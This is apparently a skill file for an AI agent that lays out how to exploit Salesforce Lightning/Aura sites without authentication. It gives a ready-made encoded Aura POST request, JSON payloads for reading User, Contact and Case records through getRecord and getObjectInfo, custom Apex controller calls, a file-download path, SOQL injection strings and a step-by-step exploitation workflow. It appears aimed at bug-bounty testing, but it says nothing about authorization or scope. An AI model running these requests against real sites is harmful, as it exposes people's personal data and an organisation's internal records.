---
name: salesforce-testing
description: "Exploit Salesforce Lightning/Aura sites through unauthenticated Aura API calls — guest user over-privilege on User/Contact/Case/Opportunity records, record-level access bypass, custom Apex controllers running without sharing, and file/attachment retrieval. Use when a site serves /s/sfsites/aura, lightning.force.com, or Experience Cloud pages."
---

# Salesforce Lightning / Aura Exploitation

> Source: Intigriti blog - Hacking Salesforce Lightning Guide

## Crown Jewel Targets

- **Guest user PII access** — unauthenticated Aura requests reading User.Email, Contact.Phone, Account.Name via getRecord
- **Custom Apex controller data leak** — `apex://CustomController/ACTION$method` running without sharing keyword in system context
- **Internal Case/Opportunity records** — guest access to `Case`, `Opportunity`, `Lead` objects containing sensitive business data
- **File/attachment download** — ContentDocument and ContentVersion objects accessible via `/sfc/servlet.shepherd/document/download/{id}`
- **HostConfigController info dump** — `getConfigData` leaking full org domain, 200+ API object mappings, Lightning/VF/Setup domains
- **SOQL injection** — user input concatenated into SOQL queries in custom Apex controllers (limited but can leak records)

## Attack Surface Signals

- URL patterns: `*.force.com`, `*.lightning.force.com`, `*.my.salesforce.com`, `*.site.com`
- `/aura`, `/s/`, `/sfsites/aura` paths responding to POST requests
- `lightning`, `aura:component`, `componentDef` references in HTML/JS
- `LSKey-c$CookieConsentPolicy` cookie in response
- `fwuid` or `auraConfig` in page source
- Custom domain with Salesforce-generated HTML structure
- LWR Commerce variant: `/vforcesite/aura` endpoint

## Reconnaissance

### Identify Salesforce Sites

- URL patterns: `*.force.com`, `*.lightning.force.com`, `*.my.salesforce.com`, `*.site.com`
- Custom domains with Salesforce behind them (check response headers, page source)
- Look for `/aura`, `/s/`, `lightning` references in HTML/JS

### Aura Endpoint Discovery

Test these paths (all may work):
```
/aura
/sfsites/aura
/s/sfsites/aura
/s/sfsites/aura?r=1&aura.ApexAction.execute=1
```

### Component Enumeration from JS

JavaScript files on Salesforce pages contain component references. Grep for:
```
descriptor.*ACTION
componentDef
aura:component
serviceComponent://
```

## Aura API Structure

### Basic Request Format
```http
POST /s/sfsites/aura HTTP/2
Host: target.my.site.com
Content-Type: application/x-www-form-urlencoded

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%22123%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.force.components.controllers.hostConfig.HostConfigController%2FACTION%24getConfigData%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22REPLACE_FWUID%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%7D&aura.token=undefined
```

### Decoded Message Structure
```json
{
  "actions": [{
    "id": "123;a",
    "descriptor": "{classType}://{namespace}/ACTION${methodName}",
    "callingDescriptor": "UNKNOWN",
    "params": {}
  }]
}
```

### Key Fields
- **descriptor**: `serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData`
- **aura.context**: Must include valid `fwuid` (framework UID) — extract from page source
- **aura.token**: `undefined` for guest access, or valid session token

### Get fwuid
Search page source for `fwuid` or `auraConfig`:
```javascript
// In page source or JS files:
"fwuid":"xxxxxxxxxxxxxxxxxx"
```

## Common Vulnerability Classes

### 1. Guest User Over-Privilege

**Impact**: Unauthenticated data access (PII, internal records)

**Test Steps**:
1. Send Aura request with `aura.token=undefined` (guest)
2. Enumerate accessible controllers/actions
3. Check if objects like `User`, `Contact`, `Account`, `Case` are readable

**Key Controllers to Test**:
```
aura://RecordUiController/ACTION$getObjectInfo
aura://RecordUiController/ACTION$getRecord
serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems
```

**Object Info Enumeration** (reveals field names):
```json
{
  "actions": [{
    "id": "1;a",
    "descriptor": "aura://RecordUiController/ACTION$getObjectInfo",
    "callingDescriptor": "UNKNOWN",
    "params": {"objectApiName": "User"}
  }]
}
```

**Objects to check**: `User`, `Contact`, `Account`, `Lead`, `Case`, `Opportunity`, `Task`, `Event`, `ContentDocument`, `EmailMessage`

### 2. Record-Level Access Bypass

Three access control layers — all must be checked:
- **Object-level**: Can guest profile access this object type?
- **Field-level**: Which fields are exposed?
- **Record-level**: Can guest read records they shouldn't?

**Read records**:
```json
{
  "actions": [{
    "id": "2;a",
    "descriptor": "aura://RecordUiController/ACTION$getRecord",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "recordId": "005XXXXXXXXXXXXXXX",
      "fields": ["User.Name","User.Email","User.Phone"]
    }
  }]
}
```

### 3. Custom Apex Controller Exposure

Custom controllers often lack `with sharing` keyword → run in system context:

```json
{
  "actions": [{
    "id": "3;a",
    "descriptor": "apex://CustomController/ACTION$getRecords",
    "callingDescriptor": "UNKNOWN",
    "params": {}
  }]
}
```

### 4. File/Attachment Access

Guest users may access files attached to cases/records they shouldn't see:
- Test `ContentDocument` and `ContentVersion` objects
- Check `/sfc/servlet.shepherd/document/download/{id}`
- Files on community portals may lack ownership checks

## Tools

| Tool | Purpose |
|------|---------|
| [Misconfig Mapper](https://github.com/intigriti/misconfig-mapper) | Automated Aura endpoint detection |
| [SFScan](https://github.com/AXErunners/sfscan) | Salesforce misconfiguration scanner |
| Salesforce Inspector (Chrome ext) | Explore objects, fields, SOQL queries |
| Burp Suite | Intercept/replay Aura requests, test access control |

## Exploitation Workflow

```
1. Discover Salesforce site (*.force.com, *.site.com, custom domain)
2. Extract fwuid from page source / JS
3. Send unauthenticated Aura request to /s/sfsites/aura
4. Enumerate objects: getObjectInfo for User, Contact, Account, etc.
5. Read records: getRecord with field lists
6. Test custom Apex controllers found in JS (apex://XxxController/ACTION$method)
7. Check file access: ContentDocument, download servlet
8. Document: PII exposure, IDOR, access control bypass
```

## SOQL Injection (Advanced)

If custom Apex controllers build SOQL queries with user input:
```
' OR Name != '
%27+OR+1%3D1--
```
Limited impact (no UNION, no stacked queries) but can leak records.

## Severity Guide

| Finding | Typical Severity |
|---------|-----------------|
| Guest reads User emails/phones | High (PII exposure) |
| Guest reads internal Cases | High-Critical |
| Guest accesses file attachments | High |
| Object info disclosure only | Low-Informational |
| Custom controller data leak | Medium-Critical (depends on data) |
| SOQL injection | Medium-High |

## Quick Checklist

- [ ] Confirm Salesforce site (headers, page source, URL pattern)
- [ ] Cookie `LSKey-c$CookieConsentPolicy` = Salesforce indicator
- [ ] Extract `fwuid` from page/JS
- [ ] Test `/aura`, `/sfsites/aura`, `/s/sfsites/aura` with guest token
- [ ] HostConfigController → leaks full org domain, API object mappings (200+), Lightning/VF/Setup domains
- [ ] Enumerate standard objects (User, Contact, Account, Case)
- [ ] Enumerate custom Apex controllers from JS files
- [ ] Test record reads with known/guessable IDs
- [ ] Check file download paths
- [ ] Verify guest self-registration settings
- [ ] Test with authenticated user for privilege escalation
- [ ] Also test LWR Commerce variant: `POST TARGET/vforcesite/aura` (same payload)

---

## Operator Notes (Battle-Tested)

- **HostConfigController is the first call** — `getConfigData` with guest token reveals full org domain, 200+ API object mappings, Lightning/VF/Setup domains. This is your reconnaissance map
- **Extract fwuid before anything else** — search page source for `"fwuid":"xxx"`. Without valid fwuid, all Aura requests fail
- **Guest user access is the #1 finding class** — test `aura.token=undefined` on every controller/action. Most Salesforce bounties come from overpermissioned guest profiles
- **Custom Apex controllers are goldmines** — grep JS for `apex://` descriptors. Custom controllers often lack `with sharing` keyword, running in full system context
- **Test ALL standard objects** — User, Contact, Account, Lead, Case, Opportunity, Task, Event, ContentDocument, EmailMessage. Each could have different access rules
- **File download path bypass** — `/sfc/servlet.shepherd/document/download/{id}` may lack ownership checks even when collection access is restricted
- **LWR Commerce variant uses different path** — `POST TARGET/vforcesite/aura` with same payload format. Don't miss this if standard paths return 404

## Related Skills & Chains

| Situation | Pattern / Skill |
|-----------|----------------|
| Access control testing on Salesforce objects | `access-control-testing` |
| API testing for Aura endpoints | `api-security-testing` |
| GraphQL on Salesforce (rare but exists) | `graphql-testing` |
| JS bundle analysis for controller discovery | `js-bundle-secrets` |
| Finding chain escalation | `auto-chain-discovery` |
